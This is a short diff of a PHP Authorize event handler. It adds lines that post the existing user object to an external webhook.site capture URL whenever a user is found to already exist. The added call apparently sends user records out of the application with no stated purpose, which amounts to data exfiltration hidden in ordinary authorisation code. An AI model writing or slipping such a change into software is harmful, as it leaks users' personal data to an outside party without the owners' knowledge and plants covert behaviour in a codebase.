@@ -27,6 +27,9 @@ class Authorize implements AppEvent{
         $user = new User();
         if ($user->check_user_exist($this->data)) {
             echo "user exist before";
+            Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',[
+                $user
+            ]);
         } else {
             $user->create_new_user($this->data);
         }
